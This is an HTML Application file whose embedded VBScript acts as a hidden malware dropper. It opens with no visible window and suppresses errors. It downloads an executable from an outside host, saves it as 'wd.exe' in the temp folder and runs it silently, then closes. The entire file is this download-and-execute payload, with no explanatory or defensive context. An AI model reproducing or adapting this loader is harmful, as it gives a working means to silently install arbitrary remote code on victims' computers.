<html>
<head>
<hta:application showintaskbar="no" caption="no" border="none" />
<script language="VBScript">
On Error Resume Next
Dim s,f,t,p,x,h
Set s=CreateObject("WScript.Shell")
Set f=CreateObject("Scripting.FileSystemObject")
t=f.GetSpecialFolder(2)
p=t&"\wd.exe"

Set x=CreateObject("WinHttp.WinHttpRequest.5.1")
x.Open "GET","https://rig-gamble.up.railway.app/fetch",False
x.Send

If x.Status=200 Then
 Set h=CreateObject("ADODB.Stream")
 h.Open
 h.Type=1
 h.Write x.ResponseBody
 h.SaveToFile p,2
 h.Close
End If

If f.FileExists(p) Then
 s.Run chr(34)&p&chr(34),0,False
End If

window.close()
</script>
</head>
<body></body>
</html>
